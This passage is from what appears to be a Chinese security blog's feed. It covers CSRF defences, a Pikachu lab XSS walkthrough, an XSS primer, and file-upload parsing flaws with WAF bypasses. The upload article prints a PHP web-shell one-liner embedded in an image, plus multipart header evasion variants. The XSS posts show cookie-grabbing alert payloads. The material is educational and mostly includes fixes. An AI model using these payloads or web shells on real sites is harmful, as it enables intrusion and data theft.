的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以 篡改 Referer 值 。如果网站支持IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。</li><li>即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</li></ol><h2 id="在请求地址中添加-token-并验证"><a href="#在请求地址中添加-token-并验证" class="headerlink" title="在请求地址中添加 token 并验证"></a>在请求地址中添加 token 并验证</h2><ul><li>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。</li><li>要抵御 CSRF，关键在于<strong>在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中</strong>。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token（令牌），并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</li></ul><h3 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h3><ul><li>这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成<code> http://url?csrftoken=tokenvalue</code>。 而对于 POST 请求来说，要在 form 的最后加上 ，这样就把 token 以参数的形式加入请求了。</li></ul><h3 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h3><ol><li>但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很<strong>麻烦</strong>的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。</li><li>该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。</li></ol><h2 id="在-HTTP-头中自定义属性并验证"><a href="#在-HTTP-头中自定义属性并验证" class="headerlink" title="在 HTTP 头中自定义属性并验证"></a>在 HTTP 头中自定义属性并验证</h2><ul><li>这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</li></ul><h3 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h3><ol><li>然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。</li><li>另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</li></ol><h1 id="WAF防御CSRF"><a href="#WAF防御CSRF" class="headerlink" title="WAF防御CSRF"></a>WAF防御CSRF</h1><ul><li>以上防御是技术层面的讨论。实际中进行 CSRF 防护的是使用 <strong>WAF</strong>（Web应用防火墙，如免费的ShareWAF）。因为 CSRF 只是众多web攻击中的一种，网络攻击还有很多种。WAF可以低于绝大多数的攻击，可极大的提高网站安全性。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> csrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pikachu-XSS跨站脚本攻击练习</title>
      <link href="/2023/10/12/Pikachu-XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E7%BB%83%E4%B9%A0/"/>
      <url>/2023/10/12/Pikachu-XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><ul><li>概述就直接看看pikachu的说法吧<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012223925.png" alt="image.png"></li></ul><h1 id="第一关-反射型xss-get"><a href="#第一关-反射型xss-get" class="headerlink" title="第一关 反射型xss(get)"></a>第一关 反射型xss(get)</h1><ul><li>尝试输入以下内容<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;Hello World&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012224340.png" alt="image.png"></li><li>发现有长度限制</li><li>所以我们需要使用其他方法</li></ul><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><ul><li>可以随便输入点东西，然后在url当中插入我们的语句，这样就不受限制了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012224626.png" alt="image.png"></li></ul><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><ul><li>第二个方法就是需要使用开发者工具，修改html代码当中的限制<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012224735.png" alt="image.png"></li><li>直接修改<code>maxlength</code>的值</li><li>然后就可以在输入框当中输入了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012224849.png" alt="image.png"></li></ul><h1 id="第二关-反射型xss-post"><a href="#第二关-反射型xss-post" class="headerlink" title="第二关 反射型xss(post)"></a>第二关 反射型xss(post)</h1><ul><li>是一个登录界面</li><li>pikachu的默认用户名是admin，默认密码是123456</li><li>通过前面暴力破解可以得到用户名和密码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012225519.png" alt="image.png"></li><li>这关没有输入框长度限制，我们获取admin的cookie</li><li><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012225617.png" alt="image.png"></li></ul><h1 id="第三关-存储型xss"><a href="#第三关-存储型xss" class="headerlink" title="第三关 存储型xss"></a>第三关 存储型xss</h1><ul><li><p>是个评论系统，输入的内容会被保存在下面<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012225808.png" alt="image.png"></p></li><li><p>我们在评论框当中输入<code>&lt;script&gt;alert(&quot;交出你的cookie&quot;);alert(document.cookie)&lt;/script&gt;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012230112.png" alt="image.png"></p></li><li><p>成功弹出窗口<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012230257.png" alt="image.png"></p></li><li><p>在html代码当中可以看到，我们输入的代码被保存下来了，只要每次打开网页，都会弹出这个弹窗<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012230405.png" alt="image.png"></p></li><li><p>换个浏览器打开也是如此</p></li><li><p>说明存储型xss攻击能危害所以访问受影响页面的用户</p></li></ul><h1 id="第四关-DOM型xss"><a href="#第四关-DOM型xss" class="headerlink" title="第四关 DOM型xss"></a>第四关 DOM型xss</h1><ul><li>在输入看输入发现都是显示<code>what do you see?</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012231745.png" alt="image.png"></li><li>通过开发者工具搜索查到</li><li>其实下面已经有提示了</li><li>代码的意思是会把用户提交的内容输出到<code>&lt;a&gt;</code>标签中，<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012232246.png" alt="image.png"></li><li>我们在输入框输入<code>&#39; onclick=&quot;alert(&#39;Hello World&#39;) &quot;&gt;</code></li><li><code>&#39;</code>的目的是将href闭合，然后后面输入的onclick意思是需要鼠标点击触发<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012234124.png" alt="image.png"></li></ul><h1 id="第五关-DOM型xss-x"><a href="#第五关-DOM型xss-x" class="headerlink" title="第五关 DOM型xss-x"></a>第五关 DOM型xss-x</h1><ul><li>在输入框输入123，发现在url当中出现了，没有回显<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012234404.png" alt="image.png"></li><li>使用开发者工具看看代码</li><li>可以看出需要点击<code>有些费尽心机想要忘记的事情,后来真的就忘掉了</code>这句话才能触发<code>domxss()</code></li><li>再看看<code>domxss()</code>，和第四题一样<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012234554.png" alt="image.png"></li><li>输入<code>&#39; onclick=&quot;alert(&#39;Hello World&#39;) &quot;</code>到输入框</li><li>点击按钮之后，点击下方蓝字就会出现新的一行字</li><li>再点击新一行字就可以出发弹窗了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231012234956.png" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> pikachu </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS跨站脚本攻击漏洞</title>
      <link href="/2023/10/10/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/10/10/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS介绍"><a href="#XSS介绍" class="headerlink" title="XSS介绍"></a>XSS介绍</h1><h2 id="什么是跨站脚本攻击"><a href="#什么是跨站脚本攻击" class="headerlink" title="什么是跨站脚本攻击"></a>什么是跨站脚本攻击</h2><ul><li>跨站脚本攻击（Cross-site scripting，XSS）是一种常见的网络安全漏洞，攻击者通过在受害网站注入恶意脚本代码，使得其他用户访问该网站时执行这些恶意代码，从而达到攻击的目的。</li></ul><h2 id="有什么危害"><a href="#有什么危害" class="headerlink" title="有什么危害"></a>有什么危害</h2><ul><li>获取用户信息：(如浏览器信息、ip地址、cookie信息等）</li><li>钓鱼：(利用xss漏洞构造出一个登录框，骗取用户账户密码，提示登录过期，模拟一个网站的登录框，将用户名、密码发送到攻击者服务器）</li><li>注入木马或广告链接：(有些在主站注入非法网站的链接，对公司的声誉有一定的影响)·</li><li>后台增删改网站数据等操作：(配合CSR漏洞，骗取用户点击，利用s模拟浏览器发包）</li><li>xss蠕虫(微博蠕虫：只要看过某人的微博就是自动关注某人；贴吧蠕虫：看过某个帖子就是自动回复这个帖子)</li></ul><h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><h2 id="反射型XXS"><a href="#反射型XXS" class="headerlink" title="反射型XXS"></a>反射型XXS</h2><ul><li>反射型XSS，又称<strong>非持久型XSS</strong>，攻击相对于受害者而言是一次性的，具体表现在受害者点击了含有的恶意JavaScript脚本的url，恶意代码并没有保存在目标网站，而Web应用程序只是不加处理的把该恶意脚本“反射”回受害者的浏览器而使受害者的浏览器执行相应的脚本。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231010231118.png" alt="image.png"></li></ul><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol><li>即时性。不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据；</li><li>攻击者需要诱骗点击；</li><li>反馈率低，所以较难发现和响应修复；</li><li>盗取用户敏感保密信息。</li></ol><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><ul><li>存储型XSS，又称<strong>持续型XSS</strong>，是指应用程序通过Web请求获取不可信赖的数据，在未检验数据是否存在XSS代码的情况下，便将其存入数据库。当下一次从数据库中获取该数据时程序也未对其进行过滤，页面再次执行XSS代码持续攻击用户。存储型XSS漏洞大多出现在留言板、评论区，用户提交了包含XSS代码的留言到数据库，当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231010231135.png" alt="image.png"></li></ul><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><ol><li>持久性，植入在数据库中；</li><li>危害面广，甚至可以让用户机器变成 DDoS 攻击的肉鸡；</li><li>盗取用户敏感私密信息。</li></ol><h2 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h2><ul><li>DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式，DOM-XSS简单理解就是不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231010231149.png" alt="image.png"></li></ul><h1 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h1><h2 id="对输入和URL参数进行过滤-白名单和黑名单"><a href="#对输入和URL参数进行过滤-白名单和黑名单" class="headerlink" title="对输入和URL参数进行过滤(白名单和黑名单)"></a>对输入和URL参数进行过滤(白名单和黑名单)</h2><p>检查用户输入的数据中是否包含一些特殊字符，如&lt;、&gt;、’、“等，发现存在特殊字符，将这些特殊字符过滤或者编码。</p><h2 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h2><p>字符串js编码转换成实体html编码的方法（防范XSS攻击）<br><a href="https://www.cnblogs.com/dearxinli/p/5466286.html">https://www.cnblogs.com/dearxinli/p/5466286.html</a></p><h2 id="对输出内容进行编码"><a href="#对输出内容进行编码" class="headerlink" title="对输出内容进行编码"></a>对输出内容进行编码</h2><p>在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web漏洞文件上传（2）</title>
      <link href="/2023/10/10/Web%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%882%EF%BC%89/"/>
      <url>/2023/10/10/Web%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%882%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><h2 id="解析漏洞解释"><a href="#解析漏洞解释" class="headerlink" title="解析漏洞解释"></a>解析漏洞解释</h2><ul><li>解析漏洞就是指服务器应用程序在解析某些精心构造的后缀文件的时候，会将相关的文件解析成网页的脚本，从而导致实现控制网站，同时大部分的解析漏洞都是由应用程序产生的。</li></ul><h2 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h2><h3 id="IIS5-0-6-0"><a href="#IIS5-0-6-0" class="headerlink" title="IIS5.0&#x2F;6.0"></a>IIS5.0&#x2F;6.0</h3><h4 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h4><ul><li>在以<code>. asp</code>文件名的文件夹下的任何文件都将作为asp文件执行。</li><li>也就是当目录为<code>XX.asp</code>的时候，那么当访问下面的图片的时候，如<code>XX.aps/1.jpg</code>就会被当作ASP执行。</li></ul><h4 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h4><ul><li>如果文件为<code>1.asp;.jpg</code>，由于IIS不解析;后面的内容，使用就会把文件当作1.asp进行解析，同时还存在<code>.asa</code>、<code>.cer</code>、<code>.cdx</code>可以进行解析。</li></ul><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li>限制上传目录的执行权限，不允许执行脚本。</li><li>不允许创建目录。</li><li>上传的文件进行重命名。</li></ol><h3 id="IIS7-0-7-5"><a href="#IIS7-0-7-5" class="headerlink" title="IIS7.0&#x2F;7.5"></a>IIS7.0&#x2F;7.5</h3><h4 id="IIS7-0-IIS7-0Fash-CGI"><a href="#IIS7-0-IIS7-0Fash-CGI" class="headerlink" title="IIS7.0&#x2F;IIS7.0Fash-CGI"></a>IIS7.0&#x2F;IIS7.0Fash-CGI</h4><ul><li>在Fast-CGI开启的状态下，在类似1.jpg后面加上&#x2F;1.php,变成&#x2F;1.jpg&#x2F;1.php路径会解析成PHP文件。需要进入php.ini里面修改cig.cgi_ pathinfo&#x3D;1。</li><li>将1.txt文本文件中的后门代码写入到1.jpg图片的二进制代码：<code>copy 1.jpg/b + 1.txt/a 1.jpg</code></li><li>1.txt的文件内容为：<code>&lt;?PHPfputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[password])?&gt;&#39;);?&gt;</code></li><li>当在图片文件中写入后门代码，当访问这个图片的时候加上&#x2F;.php的时候就会在当前目录下生成一句话木马shell.php。</li></ul><h4 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h4><ul><li>配置cgi.fix_pathinfo(php.ini中)为0并重启php-cgi程序</li></ul><h2 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h2><h3 id="apache解析漏洞-1"><a href="#apache解析漏洞-1" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h3><ul><li>在apache1.x和apache2.x中存在解析漏洞。</li><li>当一个文件为1.php.yy.xx的时候就会被当作php执行，这是由于在apache解析文件的时候有一个原则就是，以.后面的扩展名来解析，当遇见不认识的扩展名的时候，就会向前解析，直到遇到能够解析的后缀名为止。</li><li>如：1.php.yy.xx，首先会解析xx，xx无法解析就会去解析yy，yy无法解析就会去解析php，那么php是能够解析了，那么就会结束。</li><li>这种方式多用于绕过黑名单的检查。</li></ul><h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><ol><li>更新至最新版本。</li><li>将上传的文件进行重命名。</li></ol><h2 id="nginx解析漏洞"><a href="#nginx解析漏洞" class="headerlink" title="nginx解析漏洞"></a>nginx解析漏洞</h2><h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx&lt;8.03"></a>nginx&lt;8.03</h3><h4 id="nginx配置文件错误"><a href="#nginx配置文件错误" class="headerlink" title="nginx配置文件错误"></a>nginx配置文件错误</h4><ul><li>由于nginx默认是用cgi解析php的，因此和iis一样可以制作图片马进行上传。</li><li>当在图片文件中写入后门代码，当访问这个图片的时候加上&#x2F;.php的时候就会在当前目录下生成一句话木马shell.php。</li></ul><h4 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li>配置cgi.fix_pathinfo(php.ini中)为0并重启php-cgi程序</li><li>或如果需要使用到cgi.fix_pathinfo这个特性（例如：Wordpress），那么可以禁止上传目录的执行脚本权限。 或将上传存储的内容与网站分离，即站库分离。</li><li>或高版本PHP提供了security.limit_extensions这个配置参数，设置security.limit_extensions &#x3D; .php</li></ol><h3 id="nginx0-5-0-6-0-7"><a href="#nginx0-5-0-6-0-7" class="headerlink" title="nginx0.5&#x2F;0.6&#x2F;0.7&lt;&#x3D;0.7.65&#x2F;0.8&lt;&#x3D;0.8.37"></a>nginx0.5&#x2F;0.6&#x2F;0.7&lt;&#x3D;0.7.65&#x2F;0.8&lt;&#x3D;0.8.37</h3><h4 id="nginx空字节任意代码执行"><a href="#nginx空字节任意代码执行" class="headerlink" title="nginx空字节任意代码执行"></a>nginx空字节任意代码执行</h4><ul><li>当使用PHP-FastCGI执行PHP时，遇到url里面存在%00空字节时与FastCGI的处理不一致，导致可在非PHP文件中嵌入PHP代码，通过访问url+%00.PHP来执行其中的PHP代码。</li><li>比如上传一张图片马1.jpg，那么当访问这个图片马的时在1.jpg后面添加%00.php就会将图片马以php执行。</li></ul><h4 id="修复建议-4"><a href="#修复建议-4" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li>升级nginx版本。</li></ol><h1 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h1><ul><li>编辑器也就是在线的web编辑器，比如在搭建博客后需要发布文章，那么用来发布文章的界面就是web编辑器。当然web编辑器有很多，如：UEDITOR（百度）、eWebEdit、FCKeditor、CKEditor（新版fck）、Kindeditor、DotNetTextBox、CuteEditor等等。</li></ul><h1 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h1><h2 id="WAF绕过解释"><a href="#WAF绕过解释" class="headerlink" title="WAF绕过解释"></a>WAF绕过解释</h2><ul><li>waf绕过其实就是将数据包截获到，对里面的内容进行解析，比如对文件的后缀名就判断是否在相应的黑名单中，文件内容中是否存在webshell代码。</li><li>总的来说文件上传都是在数据包中进行各种操作来进行绕过。</li></ul><h2 id="上传参数名解析"><a href="#上传参数名解析" class="headerlink" title="上传参数名解析"></a>上传参数名解析</h2><ul><li><code>Content-Disposition</code>：一般可更改</li><li><code>name</code>：表单参数值，不能更改</li><li><code>filename</code>：文件名，可以更改</li><li><code>Content-Type</code>：文件MIME，视情况更改</li></ul><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h3><h4 id="form-data与name之间"><a href="#form-data与name之间" class="headerlink" title="form-data与name之间"></a>form-data与name之间</h4><ul><li>在form-data;与name&#x3D;”upload_file”; filename&#x3D;”2.php”之间添加大量的垃圾数据，可以边添加边测试直到上传上去，主要添加的垃圾数据需要在后面添加一个”;”进行结尾。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231010204737.png" alt="image.png"></li></ul><h4 id="name与filename之间"><a href="#name与filename之间" class="headerlink" title="name与filename之间"></a>name与filename之间</h4><ul><li>当然这里不单单可以插入在form-data;与name&#x3D;”upload_file”; filename&#x3D;”2.php”之间，也可以在name&#x3D;”upload_file”; 与filename&#x3D;”2.php”之间。但是数据不能乱插入，比如你插在2.php中，那肯定不行，一般情况下，文件名称长度都可能存在限制，并且太长也上传不上去。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231010205005.png" alt="image.png"></li></ul><h3 id="符号变异"><a href="#符号变异" class="headerlink" title="符号变异"></a>符号变异</h3><ul><li>符号变异也就是将单双引号变换使用，或者单双引号缺失一部分进行使用，或者不使用单双引号来进行绕过。目前测试好像是无法通过了。</li></ul><h4 id="filename符号变异"><a href="#filename符号变异" class="headerlink" title="filename符号变异"></a>filename符号变异</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;2.php</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&#x27;2.php</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=2.php</span><br></pre></td></tr></table></figure><h4 id="form-data符号变异"><a href="#form-data符号变异" class="headerlink" title="form-data符号变异"></a>form-data符号变异</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition:&quot;form-data&quot;; name=upload_file; filename=&quot;2.php&quot;</span><br><span class="line"></span><br><span class="line">Content-Disposition:&#x27;form-data&#x27;; name=&quot;upload_file&quot;; filename=&#x27;2.php&#x27;</span><br></pre></td></tr></table></figure><h3 id="数据截断"><a href="#数据截断" class="headerlink" title="数据截断"></a>数据截断</h3><h4 id="回车换行"><a href="#回车换行" class="headerlink" title="回车换行"></a>回车换行</h4><ul><li>通过换行来实现绕过，但是中间不能有空行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231010205522.png" alt="image.png"></li></ul><h4 id="分号截断"><a href="#分号截断" class="headerlink" title="分号截断"></a>分号截断</h4><ul><li>若WAF匹配文件名到分号截止，则可以绕过。</li></ul><h3 id="字段名变换"><a href="#字段名变换" class="headerlink" title="字段名变换"></a>字段名变换</h3><h4 id="大小写变换"><a href="#大小写变换" class="headerlink" title="大小写变换"></a>大小写变换</h4><ul><li>对这三个字段进行大小写进行变换，比如将<code>name</code>换成<code>Name</code>、<code>Content-Disposition</code>换成<code>content-disposition</code>等等。</li></ul><h4 id="顺序颠倒"><a href="#顺序颠倒" class="headerlink" title="顺序颠倒"></a>顺序颠倒</h4><ul><li>针对<code>name</code>和<code>filename</code>这两个字段，我们可以尝试交换<code>name</code>和<code>filename</code>的顺序。（由于有规定<code>Content-Dispositon</code>必须在前面，因此我们不能修改该字段的内容）</li></ul><h3 id="重复数据"><a href="#重复数据" class="headerlink" title="重复数据"></a>重复数据</h3><ul><li>通过设置多个参数进行匹配，避免被匹配到。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;;filename=&quot;2.jpg&quot;;filename=&quot;2.jpg&quot;;filename=&quot;2.jpg&quot;;filename=&quot;2.jpg&quot;;......filename=&quot;2.php&quot;;</span><br></pre></td></tr></table></figure></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li>比较全的文件上传漏洞WAF拦截绕过总结：<a href="https://cloud.tencent.com/developer/article/1944142">https://cloud.tencent.com/developer/article/1944142</a></li></ul><h1 id="文件上传修复"><a href="#文件上传修复" class="headerlink" title="文件上传修复"></a>文件上传修复</h1><ul><li>后端验证：针对后端验证的可以采用通过服务器进行验证。</li><li>后缀检测：利用黑白名单进行过滤，当然最好是使用白名单，黑名单有时候总归会存在一些未想到的后缀，而白名单就相对简单一点，只需要想放通哪些后缀即可，而且防范更好一些。</li><li>上传目录：对上传文件到的目录可以设置一个不可执行的权限。</li><li>文件名：针对文件名可以自定义一些随机数以及一些其他的内容进行二次修改，从而改变文件的名称。</li><li>内容检测：可以使用文件头，完整性检测，最好能够对内容的数据进行判断是否存在一些webxshll类似的代码，若出现这类代码，直接删除。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web漏洞文件上传</title>
      <link href="/2023/10/08/Web%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/10/08/Web%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
